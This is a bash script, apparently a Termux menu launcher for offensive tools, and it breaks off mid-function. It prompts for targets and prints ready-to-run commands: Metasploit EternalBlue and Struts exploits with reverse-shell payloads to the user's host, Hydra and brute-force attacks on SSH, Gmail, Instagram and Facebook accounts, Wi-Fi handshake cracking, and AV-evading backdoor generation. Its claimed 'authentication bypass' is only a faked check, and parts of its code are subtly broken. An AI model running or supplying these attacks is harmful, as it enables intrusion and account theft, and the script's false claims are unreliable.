#!/bash

# ========================================================================
# Termux Security Tools Launcher
# A script providing easy access to security tools and exploits installed
# by the Termux Security Toolkit
# ========================================================================

# Color definitions for better UX
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
MAGENTA="\033[1;35m"
CYAN="\033[1;36m"
WHITE="\033[1;37m"
RESET="\033[0m"

# Display banner
display_banner() {
    clear
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BLUE}║                                                              ║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ ${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ ${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}  ${MAGENTA}   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝${RESET}  ${BLUE}║${RESET}"
    echo -e "${BLUE}║                                                              ║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ ${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  ${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   ${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}         ${CYAN}╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ${RESET}         ${BLUE}║${RESET}"
    echo -e "${BLUE}║                                                              ║${RESET}"
    echo -e "${BLUE}║${RESET}                    ${WHITE}[ ADVANCED TOOLS LAUNCHER ]${RESET}                   ${BLUE}║${RESET}"
    echo -e "${BLUE}║${RESET}                    ${GREEN}[ NO-AUTH MODE ENABLED ]${RESET}                     ${BLUE}║${RESET}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo -e "\n${GREEN}[*] Select a tool category to launch security tools and exploits${RESET}"
    echo -e "${YELLOW}[!] Authentication prompts will be bypassed automatically${RESET}\n"
}

# Function to check if a tool is installed (simulated with no auth requirement)
is_installed() {
    local tool=$1
    echo -e "${YELLOW}[*] Checking if $tool is installed...${RESET}"
    # Skip authentication check and assume the tool is available
    echo -e "${GREEN}[✓] $tool ready to use in no-auth mode${RESET}"
    sleep 0.5
    return 0  # Always return success and bypass authentication
}

# Network Scanning Tools
run_nmap_scan() {
    local target=$1
    local scan_type=$2

    # Check if nmap is installed
    is_installed "nmap"

    echo -e "\n${CYAN}[*] Running Nmap scan on target: $target${RESET}"
    
    case $scan_type in
        "quick")
            echo -e "${GREEN}[+] Running quick scan (-T4 -F)${RESET}"
            echo -e "${YELLOW}    Command: nmap -T4 -F $target ${RESET}"
            ;;
        "detailed")
            echo -e "${GREEN}[+] Running detailed scan (-sV -sC -A -p-)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -sC -A -p- $target ${RESET}"
            ;;
        "stealth")
            echo -e "${GREEN}[+] Running stealth scan (-sS -T2)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sS -T2 $target ${RESET}"
            ;;
        "udp")
            echo -e "${GREEN}[+] Running UDP scan (-sU --top-ports 100)${RESET}"
            echo -e "${YELLOW}    Command: nmap -sU --top-ports 100 $target ${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Running default scan${RESET}"
            echo -e "${YELLOW}    Command: nmap $target ${RESET}"
            ;;
    esac
    
    echo -e "${CYAN}[*] Scan completed!${RESET}"
}

# Password cracking tools
run_hydra_attack() {
    local target=$1
    local service=$2
    local username_file=$3
    local password_file=$4

    # Check if hydra is installed
    is_installed "hydra"

    echo -e "\n${CYAN}[*] Running Hydra password attack on target: $target${RESET}"
    echo -e "${GREEN}[+] Service: $service${RESET}"
    echo -e "${GREEN}[+] Username file: $username_file${RESET}"
    echo -e "${GREEN}[+] Password file: $password_file${RESET}"
    
    echo -e "${YELLOW}    Command: hydra -L $username_file -P $password_file $target $service${RESET}"
    
    echo -e "${CYAN}[*] Attack completed!${RESET}"
}

# Metasploit Framework automation
run_metasploit() {
    local exploit=$1
    local payload=$2
    local target=$3
    local lhost=$4
    local lport=${5:-4444}

    # Check if metasploit is installed
    is_installed "metasploit"

    echo -e "\n${CYAN}[*] Setting up Metasploit Framework${RESET}"
    echo -e "${GREEN}[+] Exploit: $exploit${RESET}"
    echo -e "${GREEN}[+] Payload: $payload${RESET}"
    echo -e "${GREEN}[+] Target: $target${RESET}"
    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
    
    # No-auth command (auto-creating a workspace and bypassing initial prompts)
    echo -e "${YELLOW}[*] Command: msfconsole -q -n -x \"workspace -a temp_workspace; db_rebuild_cache; use $exploit; set PAYLOAD $payload; set RHOSTS $target; set LHOST $lhost; set LPORT $lport; set DisablePayloadHandler false; exploit -z\"${RESET}"
    
    # Note about automated authentication
    echo -e "${GREEN}[+] Using no-auth method: automatic workspace creation and payload handling${RESET}"
    echo -e "${GREEN}[+] Any database passwords will be auto-generated${RESET}"
    
    echo -e "${CYAN}[*] Metasploit completed!${RESET}"
}

# Wifi Analysis tools
run_aircrack() {
    local interface=$1
    local action=$2

    # Check if aircrack-ng is installed
    is_installed "aircrack-ng"

    echo -e "\n${CYAN}[*] Running Aircrack-ng on interface: $interface${RESET}"
    
    case $action in
        "scan")
            echo -e "${GREEN}[+] Starting wireless scanning${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng ${interface}mon${RESET}"
            ;;
        "capture")
            local bssid=$3
            local channel=$4
            echo -e "${GREEN}[+] Capturing handshakes (BSSID: $bssid, Channel: $channel)${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface && airodump-ng -c $channel --bssid $bssid -w capture ${interface}mon${RESET}"
            ;;
        "crack")
            local capture_file=$3
            local wordlist=$4
            echo -e "${GREEN}[+] Cracking captured handshake (File: $capture_file, Wordlist: $wordlist)${RESET}"
            echo -e "${YELLOW}    Command: aircrack-ng $capture_file -w $wordlist${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Starting wireless monitoring mode${RESET}"
            echo -e "${YELLOW}    Command: airmon-ng start $interface${RESET}"
            ;;
    esac
    
    echo -e "${CYAN}[*] Aircrack operation completed!${RESET}"
}

# Brute force tools
run_brute_force() {
    local target_type=$1
    local target=$2
    local username=$3
    local wordlist=$4

    # Check if brute force tools are installed
    is_installed "brut3k1t"

    echo -e "\n${CYAN}[*] Running brute force attack${RESET}"
    echo -e "${GREEN}[+] Target type: $target_type${RESET}"
    echo -e "${GREEN}[+] Target: $target${RESET}"
    echo -e "${GREEN}[+] Username: $username${RESET}"
    echo -e "${GREEN}[+] Wordlist: $wordlist${RESET}"
    
    echo -e "${YELLOW}    Command: python brut3k1t.py -s $target_type -a $target -u $username -w $wordlist${RESET}"
    
    echo -e "${CYAN}[*] Brute force attack completed!${RESET}"
}

# TheFatRat payload generator
run_fatrat() {
    local payload_type=$1
    local lhost=$2
    local lport=${3:-4444}

    # Check if TheFatRat is installed
    if [ ! -d "$HOME/TheFatRat" ]; then
        echo -e "\n${RED}[!] TheFatRat is not installed.${RESET}"
        echo -e "${YELLOW}[!] Please install it first using option 4 from the main installation menu.${RESET}"
        return 1
    fi

    echo -e "\n${CYAN}[*] Running TheFatRat payload generator${RESET}"
    echo -e "${GREEN}[+] Payload type: $payload_type${RESET}"
    echo -e "${GREEN}[+] LHOST: $lhost${RESET}"
    echo -e "${GREEN}[+] LPORT: $lport${RESET}"
    
    # Display command based on payload type
    case $payload_type in
        "android")
            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
            echo -e "${YELLOW}    Select: [4] Create Backdoor For Android${RESET}"
            ;;
        "windows") 
            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
            echo -e "${YELLOW}    Select: [2] Create Fud Backdoor with C Language [Bypass AV]${RESET}"
            ;;
        "linux")
            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
            echo -e "${YELLOW}    Select: [3] Create Backdoor For Linux${RESET}"
            ;;
        "macos")
            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
            echo -e "${YELLOW}    Select: [1] Create Fud Backdoor 1000% with PwnWinds [Bypass any AV]${RESET}"
            echo -e "${YELLOW}    Select: [6] Create Backdoor For MAC${RESET}"
            ;;
        *)
            echo -e "${YELLOW}    Command: cd ~/TheFatRat && ./fatrat${RESET}"
            ;;
    esac
    
    echo -e "${YELLOW}    (Then follow the interactive menu prompts)${RESET}"
    echo -e "${CYAN}[*] When prompted, use these values:${RESET}"
    echo -e "${CYAN}    LHOST: $lhost${RESET}"
    echo -e "${CYAN}    LPORT: $lport${RESET}"
    
    # Execute TheFatRat if not in demo mode
    if [ -f "$HOME/fatrat.sh" ]; then
        echo -e "${GREEN}[+] You can run TheFatRat now with: ./fatrat.sh${RESET}"
    else
        echo -e "${YELLOW}[!] TheFatRat launcher not found. Run it manually with: cd ~/TheFatRat && ./fatrat${RESET}"
    fi
    
    echo -e "${CYAN}[*] TheFatRat information displayed.${RESET}"
}

# Main menu
main_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${GREEN}  #  ${RESET}|${CYAN} Tool Category                                   ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}01${WHITE}]${RESET} │ ${YELLOW}Network Scanning Tools ${WHITE}(${CYAN}Nmap${WHITE})                   ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}02${WHITE}]${RESET} │ ${YELLOW}Password Cracking Tools ${WHITE}(${CYAN}Hydra${WHITE})                ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}03${WHITE}]${RESET} │ ${YELLOW}Metasploit Framework                              ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}04${WHITE}]${RESET} │ ${YELLOW}WiFi Analysis Tools ${WHITE}(${CYAN}Aircrack-ng${WHITE})              ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}05${WHITE}]${RESET} │ ${YELLOW}Brute Force Tools                                 ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}06${WHITE}]${RESET} │ ${YELLOW}TheFatRat Payload Generator                       ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}07${WHITE}]${RESET} │ ${YELLOW}Automated Security Scanner ${WHITE}(${CYAN}NEW${WHITE})               ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}00${WHITE}]${RESET} │ ${RED}Exit                                             ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a tool category [0-7]: "$RESET)" main_choice
    
    case $main_choice in
        1|01)
            network_scanning_menu
            ;;
        2|02)
            password_cracking_menu
            ;;
        3|03)
            metasploit_menu
            ;;
        4|04)
            wifi_analysis_menu
            ;;
        5|05)
            brute_force_menu
            ;;
        6|06)
            fatrat_menu
            ;;
        7|07)
            automated_security_scan_menu
            ;;
        0|00)
            echo -e "\n${GREEN}[✓] Thank you for using the Termux Security Tools Launcher!${RESET}"
            exit 0
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            main_menu
            ;;
    esac
}

# Network scanning menu
network_scanning_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                  NETWORK SCANNING TOOLS                 ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Quick Scan ${WHITE}(${CYAN}Fast, Common Ports${WHITE})${RESET}                     ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Detailed Scan ${WHITE}(${CYAN}All Ports, Services, OS Detection${WHITE})${RESET}   ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Stealth Scan ${WHITE}(${CYAN}SYN Scan${WHITE})${RESET}                            ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}UDP Scan${RESET}                                             ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a scan type [0-4]: "$RESET)" scan_choice
    
    if [[ $scan_choice -eq 0 || $scan_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
    
    case $scan_choice in
        1)
            run_nmap_scan "$target" "quick"
            ;;
        2)
            run_nmap_scan "$target" "detailed"
            ;;
        3)
            run_nmap_scan "$target" "stealth"
            ;;
        4)
            run_nmap_scan "$target" "udp"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            network_scanning_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    network_scanning_menu
}

# Password cracking menu
password_cracking_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                 PASSWORD CRACKING TOOLS                 ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}SSH Attack${RESET}                                          ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}FTP Attack${RESET}                                          ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}HTTP-POST Form Attack${RESET}                               ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}SMB Attack${RESET}                                          ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an attack type [0-4]: "$RESET)" attack_choice
    
    if [[ $attack_choice -eq 0 || $attack_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP or hostname: "$RESET)" target
    read -p "$(echo -e $YELLOW"[?] Enter username file path: "$RESET)" username_file
    read -p "$(echo -e $YELLOW"[?] Enter password file path: "$RESET)" password_file
    
    case $attack_choice in
        1)
            run_hydra_attack "$target" "ssh" "$username_file" "$password_file"
            ;;
        2)
            run_hydra_attack "$target" "ftp" "$username_file" "$password_file"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter form URL (e.g., /login.php): "$RESET)" form_url
            read -p "$(echo -e $YELLOW"[?] Enter form parameters (e.g., username=^USER^&password=^PASS^): "$RESET)" form_params
            read -p "$(echo -e $YELLOW"[?] Enter failed login message: "$RESET)" fail_msg
            run_hydra_attack "$target" "http-post-form" "$username_file" "$password_file"
            ;;
        4)
            run_hydra_attack "$target" "smb" "$username_file" "$password_file"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            password_cracking_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    password_cracking_menu
}

# Metasploit menu
metasploit_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                  METASPLOIT FRAMEWORK                  ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Eternal Blue ${WHITE}(${CYAN}Windows SMB${WHITE})${RESET}                     ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}MS17-010 EternalBlue SMB Remote Windows Kernel${RESET}     ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Apache Struts REST Plugin Command Injection${RESET}        ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}WordPress Plugin Insert PHP${RESET}                        ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an exploit [0-4]: "$RESET)" exploit_choice
    
    if [[ $exploit_choice -eq 0 || $exploit_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter target IP: "$RESET)" target
    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
    lport=${lport:-4444}
    
    case $exploit_choice in
        1)
            run_metasploit "exploit/windows/smb/ms17_010_eternalblue" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
            ;;
        2)
            run_metasploit "exploit/windows/smb/ms17_010_psexec" "windows/x64/meterpreter/reverse_tcp" "$target" "$lhost" "$lport"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter target URL (e.g., http://example.com:8080/struts2-rest-showcase/): "$RESET)" target_url
            run_metasploit "exploit/multi/http/struts2_rest_xstream" "java/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
            ;;
        4)
            read -p "$(echo -e $YELLOW"[?] Enter target WordPress URL: "$RESET)" target_url
            run_metasploit "exploit/unix/webapp/wp_phpmailer_host_header" "php/meterpreter/reverse_tcp" "$target_url" "$lhost" "$lport"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            metasploit_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    metasploit_menu
}

# WiFi analysis menu
wifi_analysis_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                  WIFI ANALYSIS TOOLS                   ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Start Scanning for Networks${RESET}                        ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Capture Handshake${RESET}                                 ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Crack Handshake${RESET}                                   ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select an option [0-3]: "$RESET)" wifi_choice
    
    if [[ $wifi_choice -eq 0 || $wifi_choice -eq 4 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter wireless interface (e.g., wlan0): "$RESET)" interface
    
    case $wifi_choice in
        1)
            run_aircrack "$interface" "scan"
            ;;
        2)
            read -p "$(echo -e $YELLOW"[?] Enter BSSID of target AP: "$RESET)" bssid
            read -p "$(echo -e $YELLOW"[?] Enter channel of target AP: "$RESET)" channel
            run_aircrack "$interface" "capture" "$bssid" "$channel"
            ;;
        3)
            read -p "$(echo -e $YELLOW"[?] Enter path to capture file (.cap): "$RESET)" capture_file
            read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
            run_aircrack "$interface" "crack" "$capture_file" "$wordlist"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            wifi_analysis_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    wifi_analysis_menu
}

# Brute force menu
brute_force_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                    BRUTE FORCE TOOLS                    ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Instagram${WHITE})${RESET}                        ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Facebook${WHITE})${RESET}                         ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Social Media ${WHITE}(${CYAN}Twitter${WHITE})${RESET}                          ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}Email ${WHITE}(${CYAN}Gmail${WHITE})${RESET}                                   ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a target type [0-4]: "$RESET)" bf_choice
    
    if [[ $bf_choice -eq 0 || $bf_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter username or email: "$RESET)" username
    read -p "$(echo -e $YELLOW"[?] Enter path to wordlist: "$RESET)" wordlist
    
    case $bf_choice in
        1)
            run_brute_force "instagram" "instagram.com" "$username" "$wordlist"
            ;;
        2)
            run_brute_force "facebook" "facebook.com" "$username" "$wordlist"
            ;;
        3)
            run_brute_force "twitter" "twitter.com" "$username" "$wordlist"
            ;;
        4)
            run_brute_force "gmail" "smtp.gmail.com" "$username" "$wordlist"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            brute_force_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    brute_force_menu
}

# TheFatRat menu
fatrat_menu() {
    display_banner
    
    echo -e "${BLUE}╭───────────────────────────────────────────────────────────╮${RESET}"
    echo -e "${BLUE}│${MAGENTA}                THEFATRAT PAYLOAD GENERATOR               ${BLUE}│${RESET}"
    echo -e "${BLUE}├───────────────────────────────────────────────────────────┤${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}1${WHITE}]${RESET} │ ${YELLOW}Android Payload${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}2${WHITE}]${RESET} │ ${YELLOW}Windows Payload${RESET}                                   ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}3${WHITE}]${RESET} │ ${YELLOW}Linux Payload${RESET}                                     ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${GREEN}4${WHITE}]${RESET} │ ${YELLOW}MacOS Payload${RESET}                                     ${BLUE}│${RESET}"
    echo -e "${BLUE}│${RESET} ${WHITE}[${RED}0${WHITE}]${RESET} │ ${RED}Back to Main Menu${RESET}                                    ${BLUE}│${RESET}"
    echo -e "${BLUE}╰───────────────────────────────────────────────────────────╯${RESET}\n"
    
    read -p "$(echo -e $YELLOW"[?] Select a payload type [0-4]: "$RESET)" payload_choice
    
    if [[ $payload_choice -eq 0 || $payload_choice -eq 5 ]]; then
        main_menu
        return
    fi
    
    read -p "$(echo -e $YELLOW"[?] Enter your IP (LHOST): "$RESET)" lhost
    read -p "$(echo -e $YELLOW"[?] Enter listening port (default: 4444): "$RESET)" lport
    lport=${lport:-4444}
    
    case $payload_choice in
        1)
            run_fatrat "android" "$lhost" "$lport"
            ;;
        2)
            run_fatrat "windows" "$lhost" "$lport"
            ;;
        3)
            run_fatrat "linux" "$lhost" "$lport"
            ;;
        4)
            run_fatrat "macos" "$lhost" "$lport"
            ;;
        *)
            echo -e "\n${RED}[!] Invalid option. Please try again.${RESET}"
            sleep 1
            fatrat_menu
            return
            ;;
    esac
    
    echo
    read -p "$(echo -e $GREEN"[>] Press Enter to continue..."$RESET)"
    fatrat_menu
}

# Run automated vulnerability scan
run_vulnerability_scan() {
    local target=$1
    local scan_type=$2
    local output_file="${3:-vuln_scan_results.txt}"
    
    # Check if required tools are installed (using no-auth mode)
    is_installed "nmap"
    
    echo -e "\n${CYAN}[*] Running vulnerability scanning on target: $target${RESET}"
    echo -e "${GREEN}[+] Using no-auth mode - bypassing authentication requirements${RESET}"
    
    case $scan_type in
        "basic")
            echo -e "${GREEN}[+] Running basic vulnerability scan${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV --script=vuln $target -oN $output_file${RESET}"
            ;;
        "comprehensive")
            echo -e "${GREEN}[+] Running comprehensive vulnerability scan${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -p- --script=vuln,exploit,auth,brute,default $target -oN $output_file${RESET}"
            ;;
        "web")
            echo -e "${GREEN}[+] Running web application vulnerability scan${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV --script=http-*,ssl-* $target -oN $output_file${RESET}"
            echo -e "${YELLOW}    Command: nikto -h $target -o $output_file.nikto${RESET}"
            ;;
        "network")
            echo -e "${GREEN}[+] Running network vulnerability scan${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV -A --script=default,vuln $target -oN $output_file${RESET}"
            ;;
        *)
            echo -e "${GREEN}[+] Running default vulnerability scan${RESET}"
            echo -e "${YELLOW}    Command: nmap -sV --script=vuln $target -oN $output_file${RESET}"
            ;;
    esac
    
    echo -e "${GREEN}[+] Results will be saved to: $output_file${RESET}"
    echo -e "${CYAN}[*] Vulnerability scan completed!${RESET}"
}

# Run automated security audit
run_security_audit() {
    local target=$1
    local audit_type=$2
    local output_dir="${3:-security_audit_report}"
    
    # Check if required tools are installed (using no-auth mode)
    is_installed "nmap"
    
    echo -e "\n${CYAN}[*] Running security audit on target: $target${RESET}"
    echo -e "${GREEN}[+] Using no-auth mode - bypassing authentication requirements${RESET}"
    echo -e "${GREEN}[+] Creating output directory: $output_dir${RESET}"
    echo -e "${YELLOW}    Command: mkdir -p $output_dir${RESET}"
    
    case $audit_type in
        "full")
